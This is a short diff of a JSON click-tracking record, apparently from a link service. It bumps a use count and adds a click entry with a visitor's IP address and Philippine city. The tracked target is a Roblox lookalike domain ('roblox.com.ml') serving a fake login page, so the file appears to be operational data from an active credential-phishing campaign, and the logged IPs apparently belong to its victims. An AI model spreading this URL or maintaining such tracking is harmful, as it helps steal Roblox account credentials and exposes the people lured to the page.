@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 497,
+    "useCount": 498,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4086,6 +4086,14 @@
         "ip": "180.190.185.85",
         "country": "Philippines",
         "city": "Lahug",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777084738052,
+        "ip": "136.158.102.79",
+        "country": "Philippines",
+        "city": "Naga",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
